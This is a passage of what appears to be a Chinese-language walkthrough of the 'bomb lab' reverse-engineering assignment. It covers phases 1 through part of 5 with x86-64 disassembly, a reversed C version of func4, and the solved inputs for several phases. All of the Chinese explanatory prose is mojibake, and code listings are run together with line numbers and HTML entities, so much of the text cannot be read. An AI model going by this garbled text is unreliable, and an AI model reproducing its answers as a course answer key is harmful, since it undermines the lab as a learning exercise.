rsiå°±æ˜¯ç»™string_not_equalçš„å‡½æ•°ï¼Œé‚£ä¹ˆstring_not_equalçš„è¿”å›žå€¼æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ çœ‹åˆ°string_not_equalè¿”å›žåŽçš„5ã€6ä¸¤å¥ï¼Œæµ‹è¯•äº†eaxçš„å€¼ï¼Œåœ¨eaxç­‰äºŽ0æ—¶å°±è·³è½¬åˆ°400ef7ï¼Œå¦‚æžœä¸ä¸º0ï¼Œé‚£ä¹ˆä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œä¸‹é¢ä¸€å¥æ˜¯è°ƒç”¨explode_bombå‡½æ•°ï¼Œä¸ç”¨è¯´è¿™ä¸€å®šæ˜¯è§¦å‘ç‚¸å¼¹çš„å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä»¤string_not_equalçš„è¿”å›žå€¼ä¸º0ï¼Œé‚£ä¹ˆä»Žåå­—åˆ¤æ–­ï¼Œæˆ‘ä»¬éœ€è¦ä»¤ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²ä¹‹å‰è¯´è¿‡å­˜æ”¾åœ¨rdiä¸Žrsiä¸­ï¼Œrdiæ˜¯æˆ‘ä»¬è¯»å…¥çš„å­—ç¬¦ä¸²ï¼Œè€Œrsiä¸­å­˜æ”¾çš„æ˜¯400ee4å¤åˆ¶çš„0x402400ï¼Œè¿™ä¸ªæ—¶å€™ç”¨gdbåŽ»æŸ¥çœ‹è¯¥åœ°å€ä¸­å­˜æ”¾çš„å­—ç¬¦ä¸²æ¯”è¾ƒæ–¹ä¾¿ï¼š è¿™ä¸²å­—ç¬¦å°±æ˜¯ç¬¬ä¸€é˜¶æ®µçš„ç­”æ¡ˆã€‚ é˜¶æ®µäºŒ12345678910111213141516171819202122232425400efc: 55 push %rbp400efd: 53 push %rbx400efe: 48 83 ec 28 sub $0x28,%rsp400f02: 48 89 e6 mov %rsp,%rsi400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt;400f0a: 83 3c 24 01 cmpl $0x1,(%rsp)400f0e: 74 20 je 400f30 &lt;phase_2+0x34&gt;400f10: e8 25 05 00 00 callq 40143a &lt;explode_bomb&gt;400f15: eb 19 jmp 400f30 &lt;phase_2+0x34&gt;400f17: 8b 43 fc mov -0x4(%rbx),%eax400f1a: 01 c0 add %eax,%eax400f1c: 39 03 cmp %eax,(%rbx)400f1e: 74 05 je 400f25 &lt;phase_2+0x29&gt;400f20: e8 15 05 00 00 callq 40143a &lt;explode_bomb&gt;400f25: 48 83 c3 04 add $0x4,%rbx400f29: 48 39 eb cmp %rbp,%rbx400f2c: 75 e9 jne 400f17 &lt;phase_2+0x1b&gt;400f2e: eb 0c jmp 400f3c &lt;phase_2+0x40&gt;400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp400f3a: eb db jmp 400f17 &lt;phase_2+0x1b&gt;400f3c: 48 83 c4 28 add $0x28,%rsp400f40: 5b pop %rbx400f41: 5d pop %rbp400f42: c3 retq è¿›å…¥phase_2å‡½æ•°ï¼Œè§‚å¯Ÿå®ƒçš„ä»£ç ï¼Œå¯ä»¥å‘çŽ°ç¬¬5è¡Œè°ƒç”¨äº†ä¸€ä¸ªåä¸ºread_six_numbersè¿™ä¸ªå‡½æ•°ï¼Œé¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨åº”è¯¥æ˜¯ä»Žè¾“å…¥ä¸­è¯»å–6ä¸ªæ•°å­—ï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œè¿™6ä¸ªæ•°å­—æ˜¯æ€Žä¹ˆè¿”å›žçš„å‘¢ï¼Ÿæˆ‘ä»¬æ³¨æ„åˆ°ç¬¬4è¡Œä¸­æŠŠrspçš„å€¼å¤åˆ¶ç»™äº†rsiï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹è¿™ä¸ªå‡½æ•°æ˜¯ä½¿ç”¨æ ˆæ¥è¿”å›žè¯»å…¥çš„ç»“æžœã€‚ å½“ç„¶åªæ˜¯çŒœæµ‹æ˜¯ä¸è¡Œçš„ï¼Œæˆ‘ä»¬éœ€è¦ç”¨å®žéªŒåŽ»éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•ï¼Œæˆ‘ä»¬åœ¨è¾“å…¥æ–‡ä»¶ä¸­è®¾ç½®1 2 3 4 5 6è¿™ä¸€è¡Œè¾“å…¥ï¼Œç„¶åŽå°†æ–­ç‚¹æ‰“åœ¨*400f0aè¿™ä¸ªå‡½æ•°åˆšè¿”å›žçš„ä½ç½®ï¼ˆæ³¨æ„è¾“å…¥ä¸­åº”è¯¥å«æœ‰ç¬¬ä¸€é˜¶æ®µçš„ç­”æ¡ˆï¼Œä¸ç„¶ç‚¸å¼¹å°±ç‚¸åœ¨ç¬¬ä¸€é˜¶æ®µäº†ï¼‰ã€‚è¿è¡Œåœåœ¨æ–­ç‚¹ä¹‹åŽæŸ¥çœ‹æ ˆä¸­çš„å†…å®¹ï¼š æˆ‘ä»¬æ‰“å‡ºäº†rspå¼€å§‹32å­—èŠ‚çš„å†…å®¹ï¼Œå‘çŽ°æ ˆä¸­ä¾æ¬¡å­˜æ”¾äº†è¾“å…¥çš„6ä¸ªæ•°ï¼Œä¹‹åŽå°±æ˜¯è¿”å›žçš„åœ°å€ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç¡®å®šè¯»å–çš„æ•°å€¼å°±æ˜¯ä¾æ¬¡å­˜æ”¾åœ¨æ ˆä¸­çš„ã€‚ æŽ¥ä¸‹æ¥çœ‹ç¬¬6ã€7ã€8è¡Œï¼Œå®ƒå°†rspä¸­å­˜æ”¾çš„å€¼ä¸Ž1è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœç›¸ç­‰åˆ™è·³è¿‡ç¬¬8è¡Œçš„å¼•çˆ†ä»£ç ï¼Œè¯´æ˜Žæˆ‘ä»¬éœ€è¦è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°ä¸º1 ã€‚å†çœ‹è·³è½¬åˆ°çš„ä½ç½®ï¼ˆ19ã€20è¡Œï¼‰å°†rsp+0x4ä¸Žrsp+0x18çš„å€¼åˆ†åˆ«å­˜æ”¾åˆ°äº†rbxä¸Žrbpã€‚ä¸‹ä¸€è¡Œåˆè¿›è¡Œäº†ä¸€æ¬¡è·³è½¬ï¼Œæ¥åˆ°äº†ç¬¬10è¡Œï¼Œç¬¬10è¡Œå°†rbxçš„åœ°å€å‡4ä¸­å­˜æ”¾çš„å†…å®¹å¤åˆ¶åˆ°äº†eaxä¸­ï¼Œrbxçš„åœ°å€å‡4ä¹Ÿå°±æ„å‘³ç€ä¸Žrspç›¸ç­‰ï¼Œå®ƒçš„å€¼ä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªè¯»å…¥çš„å€¼ã€‚ä¸‹ä¸€è¡Œå°†eaxçš„å€¼ä¹˜äºŒï¼ŒæŽ¥ä¸‹æ¥å°†ä¹˜äºŒåŽçš„å€¼ä¸Žrbxä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ªå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœç›¸åŒåˆ™è·³è¿‡å¼•çˆ†ä»£ç ã€‚ä¸Šé¢è¿™ä¸€ç³»åˆ—æ“ä½œæ€»ç»“èµ·æ¥å°±æ˜¯å¦‚æžœç¬¬äºŒä¸ªå€¼æ˜¯ç¬¬ä¸€ä¸ªå€¼çš„ä¸¤å€åˆ™ä¸å¼•çˆ†ã€‚ å†å¾€ä¸‹å°±æ˜¯æŠŠrbxçš„å€¼åŠ ä¸Š4ï¼Œå› ä¸ºä¸€ä¸ªintå 4ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æŠŠrbxæŒ‡å‘äº†ä¸‹ä¸€ä¸ªè¯»å…¥çš„å€¼ã€‚ä¸‹ä¸€æ­¥å°†rbxä¸Žrbpçš„å€¼è¿›è¡Œæ¯”è¾ƒï¼Œå›žæƒ³rbpçš„å€¼ä¸ºçš„rsp+0x18ä¹Ÿå°±æ˜¯ rsp+24ï¼ŒæŒ‡å‘6ä¸ªintå€¼ä¹‹åŽçš„ä½ç½®ï¼Œæ‰€ä»¥ä¸Žå®ƒè¿›è¡Œæ¯”è¾ƒå°±æ˜¯åˆ¤æ–­æ˜¯å¦åˆ°è¾¾ä¸´ç•Œæ¡ä»¶ã€‚å¦‚æžœæ²¡æœ‰åˆ°è¾¾ä¸´ç•Œæ¡ä»¶ï¼Œåˆ™è·³åˆ°ä¸Šä¸€æ®µä¸­æ¯”è¾ƒçš„éƒ¨åˆ†ç»§æ‰¿è¿›è¡Œã€‚çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥åˆ¤æ–­å‡ºphase_2çš„è¦æ±‚æ˜¯è¯»å…¥çš„6ä¸ªæ•°ç¬¬ä¸€ä¸ªæ•°å¿…ä¸º1ï¼Œè€ŒåŽé¢çš„æ•°å­—éƒ½æ˜¯å‰é¢ä¸€ä¸ªæ•°å­—çš„ä¸¤å€ã€‚ æ‰€ä»¥é˜¶æ®µ2çš„ç­”æ¡ˆä¸º1 2 4 8 16 32. é˜¶æ®µä¸‰é˜¶æ®µä¸‰çš„ä»£ç æ¯”è¾ƒé•¿ï¼Œæˆ‘ä»¬åˆ†å¼€æ¥çœ‹ï¼š 12345678910111213140000000000400f43 &lt;phase_3&gt;: 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 400f60: 83 f8 01 cmp $0x1,%eax 400f63: 7f 05 jg 400f6a &lt;phase_3+0x27&gt; 400f65: e8 d0 04 00 00 callq 40143a &lt;explode_bomb&gt; 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f: 77 3c ja 400fad &lt;phase_3+0x6a&gt; 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) ç¬¬3ã€4ä¸¤è¡Œå°†rsp+0xcä¸Žrsp+0x8çš„å€¼åˆ†åˆ«ç»™rcxä¸Žrdxï¼Œä¸‹ä¸€è¡Œå°†ä¸€ä¸ªåœ°å€å€¼å¤åˆ¶ç»™äº†esiï¼ŒæŽ¥ç€å°†eaxç½®ä¸º0ï¼Œä¸‹ä¸€æ­¥è°ƒç”¨äº†åº“å‡½æ•°sscanfï¼Œæˆ‘ä»¬æƒ³åˆ°sscanfä¸­çš„å‚æ•°ä¸­éœ€è¦ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆesiä¸­çš„è¿™ä¸ªåœ°å€å€¼å°±å¾ˆæœ‰å¯èƒ½å­˜æ”¾äº†è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬åŒæ ·ä½¿ç”¨gdbåœ¨è¿è¡Œæ—¶æŸ¥çœ‹è¿™ä¸ªå­—ç¬¦ä¸²ï¼š å¯ä»¥çœ‹åˆ°è¿™å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè¯»å…¥çš„æ˜¯ä¸¤ä¸ªæ•´åž‹å€¼ã€‚è¿™ä¸¤ä¸ªå€¼å­˜æ”¾åœ¨å“ªé‡Œå‘¢ï¼Ÿæˆ‘ä»¬æƒ³åˆ°ä¹‹å‰æŠŠrsp+0xcä¸Žrsp+0x8çš„å€¼åˆ†åˆ«ç»™rcxä¸Žrdxï¼Œè¿™æ˜¯ä¸¤ä¸ªåœ°å€å€¼ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¹‹å‰çš„æ–¹æ³•éªŒè¯æ ˆä¸­å­˜æ”¾çš„ç¡®å®žæ˜¯æˆ‘ä»¬è¯»å…¥çš„è¿™ä¸¤ä¸ªå€¼ã€‚ ä¸‹é¢ç¬¬8è¡Œå°†eaxä¸Ž1è¿›è¡Œæ¯”è¾ƒï¼Œeaxä¸€èˆ¬ç”¨äºŽå­˜æ”¾å‡½æ•°è¿”å›žå€¼ï¼Œè€Œsscanf çš„è¿”å›žå€¼æ˜¯æˆåŠŸè¯»å…¥çš„æ•°å€¼ä¸ªæ•°ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™å‡ è¡Œå°†æˆåŠŸè¯»å…¥çš„ä¸ªæ•°ä¸Ž1è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœå¤§äºŽ1åˆ™è·³è¿‡å¼•çˆ†çš„ä»£ç ã€‚ ä¸‹é¢ç¬¬11è¡Œå°†rsp+0x8ä¸­å­˜æ”¾çš„å€¼ä¸Ž0x7è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœå¤§äºŽ0x7åˆ™è·³åˆ°400fadçš„ä½ç½®ï¼Œæˆ‘ä»¬çœ‹è¿™ä¸ªåœ°å€çš„æŒ‡ä»¤ï¼š 1400fad: e8 88 04 00 00 callq 40143a &lt;explode_bomb&gt; å¼•çˆ†ç‚¸å¼¹ã€‚ ä¸‹é¢çš„ä¸¤è¡Œæ¯”è¾ƒå…³é”®ï¼šç¬¬13è¡Œå°†rsp+0x8ä¸­å­˜æ”¾çš„å€¼å¤åˆ¶å…¥eaxï¼Œç¬¬14è¡Œè¿›è¡Œä¸€ä¸ªè·³è½¬ï¼Œè·³è½¬åˆ°çš„åœ°å€ä¸º0x402470(,%rax,8)ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå…¸åž‹çš„switchè¯­å¥çš„å®žçŽ°ï¼šç›´æŽ¥è·³è½¬åˆ°ç´¢å¼•*ä½ç§»çš„æŒ‡ä»¤ä½ç½®ã€‚ 123456789101112131415161718192021222324252627282930313233x = 0400f7c: b8 cf 00 00 00 mov $0xcf,%eax400f81: eb 3b jmp 400fbe &lt;phase_3+0x7b&gt;x = 2400f83: b8 c3 02 00 00 mov $0x2c3,%eax400f88: eb 34 jmp 400fbe &lt;phase_3+0x7b&gt;x = 3400f8a: b8 00 01 00 00 mov $0x100,%eax400f8f: eb 2d jmp 400fbe &lt;phase_3+0x7b&gt;x = 4400f91: b8 85 01 00 00 mov $0x185,%eax400f96: eb 26 jmp 400fbe &lt;phase_3+0x7b&gt;x = 5400f98: b8 ce 00 00 00 mov $0xce,%eax400f9d: eb 1f jmp 400fbe &lt;phase_3+0x7b&gt;x = 6400f9f: b8 aa 02 00 00 mov $0x2aa,%eax400fa4: eb 18 jmp 400fbe &lt;phase_3+0x7b&gt;x = 7400fa6: b8 47 01 00 00 mov $0x147,%eax400fab: eb 11 jmp 400fbe &lt;phase_3+0x7b&gt;400fad: e8 88 04 00 00 callq 40143a &lt;explode_bomb&gt;400fb2: b8 00 00 00 00 mov $0x0,%eax400fb7: eb 05 jmp 400fbe &lt;phase_3+0x7b&gt;x = 1400fb9: b8 37 01 00 00 mov $0x137,%eax400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax400fc2: 74 05 je 400fc9 &lt;phase_3+0x86&gt;400fc4: e8 71 04 00 00 callq 40143a &lt;explode_bomb&gt;400fc9: 48 83 c4 18 add $0x18,%rsp400fcd: c3 retq ä¸Šé¢çš„ä»£ç å·²ç»åŠ äº†æ³¨é‡Šï¼Œå‡è®¾è¯»å…¥çš„ç¬¬ä¸€ä¸ªæ•°ä¸ºxï¼Œçœ‹åˆ°æ‰€æœ‰åˆ†æ”¯æœ€åŽéƒ½è·³è½¬åˆ°äº†400fbeè¿™è¡Œåˆ¤æ–­ä¸­ï¼Œå°†eaxä¸­çš„å€¼ä¸Žrsp+0xcä¹Ÿå°±æ˜¯æˆ‘ä»¬è¯»å…¥çš„ç¬¬äºŒä¸ªæ•°è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æžœç›¸ç­‰çš„è¯è·³è¿‡å¼•çˆ†ä»£ç ã€‚ è€Œæ¯ä¸ªåˆ†æ”¯éƒ½å°†ä¸€ä¸ªæ•°å¤åˆ¶åˆ°äº†eaxä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦æ ¹æ®ä¸åŒçš„ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼è¯»å…¥å¯¹åº”çš„ç¬¬äºŒä¸ªå‚æ•°å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥éšæ„é€‰æ‹©ä¸€ä¸ªxå€¼ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©x=1ï¼Œå¯¹åº”çš„ç¬¬äºŒä¸ªå‚æ•°ä¸º0x137æ¢æˆåè¿›åˆ¶æ˜¯311ï¼Œæ‰€ä»¥ç¬¬3é˜¶æ®µçš„ï¼ˆä¸€ä¸ªï¼‰ç­”æ¡ˆä¸ºï¼š 1 311 é˜¶æ®µå››123456789101112131415161718000000000040100c &lt;phase_4&gt;: 40100c: 48 83 ec 18 sub $0x18,%rsp 401010: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a: be cf 25 40 00 mov $0x4025cf,%esi 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 401029: 83 f8 02 cmp $0x2,%eax 40102c: 75 07 jne 401035 &lt;phase_4+0x29&gt; 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033: 76 05 jbe 40103a &lt;phase_4+0x2e&gt; 401035: e8 00 04 00 00 callq 40143a &lt;explode_bomb&gt; 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi 401048: e8 81 ff ff ff callq 400fce &lt;func4&gt; 40104d: 85 c0 test %eax,%eax 40104f: 75 07 jne 401058 &lt;phase_4+0x4c&gt; å‰é¢çš„ä»£ç æ¯”è¾ƒç†Ÿæ‚‰ï¼ŒåŒæ ·æ˜¯è°ƒç”¨äº†sscanfå‡½æ•°ï¼Œæˆ‘ä»¬æŸ¥çœ‹æ ¼å¼å­—ç¬¦ä¸²ï¼š ä¹Ÿæ˜¯è¯»å…¥ä¸¤ä¸ªå‚æ•°å­˜æ”¾åœ¨rcxä¸Žrdxä¸­ã€‚ åŒæ ·å¯¹è¯»å…¥å‚æ•°çš„ä¸ªæ•°è¿›è¡Œäº†åˆ¤æ–­ï¼Œè¦æ±‚æˆåŠŸè¯»å…¥å‚æ•°çš„ä¸ªæ•°ç­‰äºŽä¸¤ä¸ªï¼Œç¬¬11ã€12è¡Œè¦æ±‚è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å°äºŽ0xeã€‚ æŽ¥ä¸‹æ¥æŠŠ0xeèµ‹ç»™edxã€0x0èµ‹ç»™esiï¼Œrsp+0x8çš„å€¼èµ‹ç»™ediã€‚æŽ¥ä¸‹æ¥è°ƒç”¨äº†func4å‡½æ•°ã€‚ åœ¨åŽ»æŸ¥çœ‹func4å‡½æ•°çš„ä»£ç ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæŸ¥çœ‹å‡½æ•°è¿”å›žåŽçš„ä»£ç ï¼Œäº†è§£æˆ‘ä»¬éœ€è¦çš„ç»“æžœã€‚ç¬¬17ã€18è¡Œæµ‹è¯•äº†eaxçš„å€¼å¦‚æžœä¸ä¸º0ï¼Œå°±è·³è½¬åˆ°å¼•çˆ†ä»£ç ã€‚ æ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è¿”å›žæ—¶eaxçš„å€¼ä¸º0.ä¸‹é¢è¿›å…¥func4å‡½æ•°ã€‚ 12345678910111213141516171819202122230000000000400fce &lt;func4&gt;: 400fce: 48 83 ec 08 sub $0x8,%rsp 400fd2: 89 d0 mov %edx,%eax 400fd4: 29 f0 sub %esi,%eax 400fd6: 89 c1 mov %eax,%ecx 400fd8: c1 e9 1f shr $0x1f,%ecx 400fdb: 01 c8 add %ecx,%eax 400fdd: d1 f8 sar %eax 400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 &lt;func4+0x24&gt; 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce &lt;func4&gt; 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 &lt;func4+0x39&gt; 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 &lt;func4+0x39&gt; 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce &lt;func4&gt; 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007: 48 83 c4 08 add $0x8,%rsp 40100b: c3 retq è¿™æ®µä»£ç ä¹‹ä¸­æˆ‘ä»¬è°ƒç”¨äº†func4ï¼Œè¿™æ˜¯ä¸€ä¸ªé€’å½’çš„è¿‡ç¨‹ï¼Œåƒä¹‹é—´é‚£æ ·ç›´æŽ¥åˆ†æžæ¯”è¾ƒå›°éš¾ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å°†è¿™ä¸ªä»£ç é€†å‘ä¸ºCè¯­è¨€å†æ¥åˆ†æžï¼Œä¸‹é¢æ˜¯é€†å‘å‡ºçš„Cè¯­è¨€ä»£ç ï¼š 12345678910111213int fun(int a1, int a2, int x)&#123; int b = (a1 - a2) &gt;&gt; 31; int result = ((a1-a2) + b) &gt;&gt; 1; b = result + a2; if(b == x) return 0; if(b &lt; x) &#123; result = fun(a1, b + 1, x); return result * 2 + 1; &#125;else&#123; result = fun(b - 1, a2, x); return result * 2; &#125;&#125; è¿™é‡Œçš„a1``a2åˆå§‹å€¼åˆ†åˆ«ä¸ºä¹‹å‰çš„0xeä¸Ž0x0ã€‚æˆ‘ä»¬å¯ä»¥ç›´æŽ¥å†™ä¸ªæµ‹è¯•ç¨‹åºæ¥è·‘å‡ºèƒ½è¿”å›ž0çš„è¾“å…¥å€¼ï¼š 123456789int main(void)&#123; for(int i = 0; i &lt;= 0xe; i++)&#123; if(fun(0xe,0,i) == 0)&#123; printf("%d\n",i) ; return 0; &#125; &#125; return 0; &#125; å¾—å‡ºå…è®¸çš„å€¼æœ‰0 1 3 7. å›žåˆ°phase_4çš„ä»£ç ï¼š 12345401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp)401056: 74 05 je 40105d &lt;phase_4+0x51&gt;401058: e8 dd 03 00 00 callq 40143a &lt;explode_bomb&gt;40105d: 48 83 c4 18 add $0x18,%rsp401061: c3 retq ç¬¬1ã€2è¡Œå°†è¾“å…¥çš„ç¬¬äºŒä¸ªå‚æ•°ä¸Ž0è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœä¸ä¸º0å°±å¼•çˆ†ç‚¸å¼¹ã€‚æ‰€ä»¥è¾“å…¥çš„ç¬¬äºŒä¸ªå‚æ•°å¿…ä¸º0ã€‚ ç»¼ä¸Šæˆ‘ä»¬å¾—å‡ºï¼ˆä¸€ä¸ªï¼‰ç­”æ¡ˆä¸ºï¼š 0 0 é˜¶æ®µäº”åŽé¢çš„é˜¶æ®µéš¾åº¦å¼€å§‹åŠ å¤§ï¼Œæˆ‘ä»¬åˆ†éƒ¨åˆ†è¿›è¡Œåˆ†æžï¼š 12345670000000000401062 &lt;phase_5&gt;: 401062: 53 push %rbx 401063: 48 83 ec 20 sub $0x20,%rsp 401067: 48 89 fb mov %rdi,%rbx 40106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp) ç¬¬4è¡ŒæŠŠè¾“å…¥çš„åœ°å€rdiç»™rbxï¼Œç¬¬5ã€7è¡Œåˆ™æ˜¯åœ¨æ ˆä¸­åŽ‹å…¥äº†ä¸€ä¸ªå“¨å…µå˜é‡ã€‚ 12345401078: 31 c0 xor %eax,%eax40107a: e8 9c 02 00 00 callq 40131b &lt;string_length&gt;40107f: 83 f8 06 cmp $0x6,%eax401082: 74 4e je 4010d2 &lt;phase_5+0x70&gt;401084: e8 b1 03 00 00 callq 40143a &lt;explode_bomb&gt; ç¬¬1è¡Œæ¸…ç©ºäº†eaxï¼Œç¬¬2è¡Œä¸­è°ƒç”¨äº†string_lengthï¼Œæˆ‘ä»¬æƒ³åˆ°ä¹‹å‰çš„æŠŠè¾“å…¥æ”¾å…¥rbxè¿™ä¸ªåŠ¨ä½œï¼Œå¯ä»¥æŽ¨æµ‹è¿™ä¸ªå‡½æ•°æ˜¯ä¸ºäº†ç»Ÿè®¡è¾“å…¥å­—ç¬¦çš„ä¸ªæ•°ï¼Œå¹¶å­˜æ”¾åœ¨äº†eaxä¸­ã€‚ ä¸‹é¢å°†eaxçš„å€¼ä¸Ž0x6è¿›è¡Œæ¯”è¾ƒï¼Œç­‰äºŽåˆ™è¿›è¡Œè·³è½¬é¿å…å¼•çˆ†ç‚¸å¼¹ã€‚æˆ‘ä»¬è¿›å…¥è·³è½¬åˆ°çš„ä½ç½®ï¼š 124010d2: b8 00 00 00 00 mov $0x0,%eax4010d7: eb b2 jmp 40108b &lt;phase_5+0x29&gt; æŠŠeaxç½®ä¸º0åŽè¿›è¡Œè·³è½¬ã€‚ ç»§ç»­è¿›å…¥è·³è½¬åˆ°çš„ä½ç½®ï¼š 12345678940108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f: 88 0c 24 mov %cl,(%rsp) 401092: 48 8b 14 24 mov (%rsp),%rdx 401096: 83 e2 0f and $0xf,%edx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax 4010ac: 75 dd jne 40108b &lt;phase_5+0x29&gt; ç¬¬1è¡Œä¸­movzblå‘½ä»¤å°†ä»Žrbxï¼ˆè¾“å…¥ï¼‰å¼€å§‹çš„raxä½ç½®çš„ä¸€ä¸ªå­—èŠ‚èµ‹ç»™ecxçš„ä½Ž16ä½ã€‚ æŽ¥ä¸‹æ¥çš„ä¸¤è¡Œå…ˆæŠŠclä¸­çš„å€¼ï¼ˆä¸Šä¸€æ­¥å¾—åˆ°ï¼‰å¤åˆ¶åˆ°rspå¤„ï¼Œå†å°†rspä¸­çš„å€¼å¤åˆ¶åˆ°rdxä¸­ï¼Œç¬¬4è¡Œä½¿ç”¨æŽ©ç 0xfå–edxçš„ä½Ž4ä½ã€‚åˆ°è¿™é‡Œæˆ‘ä»¬æ€»ç»“ä¸€ä¸‹ä¸Šé¢çš„æ“ä½œï¼šå–è¯»å…¥çš„å­—ç¬¦ä¸²ä¸­raxä½ç½®å¤„çš„å­—ç¬¦ï¼Œå†å–å®ƒçš„ä½Ž4ä½æ”¾åœ¨edxä¸­ã€‚ ä¸‹é¢ç¬¬5è¡Œä¸­ï¼Œå°†åœ°å€0x4024b0+rdxä¸­çš„ä¸€ä¸ªå­—èŠ‚æ”¾å…¥edxçš„ä½Ž16ä½ä¸­ã€‚ç¬¬6è¡Œå°†è¿™16ä½å¤åˆ¶åˆ°äº†rsp+0x10+raxçš„ä½ç½®ä¸­ã€‚ æŽ¥ä¸‹æ¥æŠŠraxåŠ 1ï¼Œæˆ‘ä»¬ä»Žå‰é¢å¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªraxèµ·çš„æ˜¯ä¸€ä¸ªç´¢å¼•çš„ä½œç”¨ã€‚ç¬¬ 8è¡Œä¸Ž6è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœä¸ç­‰äºŽ6åˆ™è·³åˆ°ç¬¬1è¡Œé‡å¤è¿™ä¸ªè¿‡ç¨‹ã€‚ åœ¨è¿™æ®µä¹‹ä¸­ï¼Œå¾ªçŽ¯ä¸€å…±è¿›è¡Œäº†6æ¬¡ï¼Œåˆ†åˆ«è¯»å–äº†è¾“å…¥çš„6ä¸ªå­—ç¬¦ï¼Œè®°å½•è¿™ä¸ª6ä¸ªå­—ç¬¦çš„ä½Ž6ä½ä½œä¸ºç´¢å¼•rdxï¼Œä»Ž0x4024b0+rdxçš„ä½ç½®å¤åˆ¶ä¸€ä¸ªå­—èŠ‚åˆ°rsp+0x10å¼€å§‹çš„6å­—èŠ‚ä¸­ã€‚ç»“æŸä¹‹åŽï¼Œrsp+0x10å¼€å§‹å­˜æ”¾äº†6ä¸ªå­—ç¬¦ã€‚ 14010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) æŽ¥ä¸‹æ¥ä¸€è¡Œåœ¨rsp+0x16çš„ä½ç½®ä¹Ÿå°±æ˜¯6ä¸ªå­—ç¬¦ä¹‹åŽç½®ä¸Šä¸€ä¸ª0x0ä¹Ÿå°±æ˜¯ç»ˆæ­¢ç¬¦\0ã€‚ 1234564010b3: be 5e 24 40 00 mov $0x40245e,%esi4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi4010bd: e8 76 02 00 00 callq 401338 &lt;strings_not_equal&gt;4010c2: 85 c0 test 